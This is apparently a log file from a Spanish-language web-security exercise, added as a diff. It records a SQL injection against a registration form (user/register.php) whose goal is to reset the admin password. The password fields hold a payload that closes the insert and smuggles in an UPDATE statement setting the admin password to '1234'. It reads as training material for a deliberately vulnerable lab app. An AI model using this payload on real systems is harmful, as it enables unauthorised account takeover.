@@ -1,0 +1,19 @@
+Ejercicio: 6
+
+Objetivo:
+    modificar de forma ilegal la clave del usuario admin
+
+Punto de entrada:
+    user/register.php
+
+Datos:
+    user: q
+    Name: q
+    Blog title: q
+    password:  f',time());UPDATE users set password='1234' where user = 'admin' --"
+    password2: f',time());UPDATE users set password='1234' where user = 'admin' --"
+URL:
+    /index.php?infoMessage=User+%27q%27+successfully+registerred
+
+Identificador:
+    20210427-104021 0829503ad5ffe9e898bcd6938b397d71
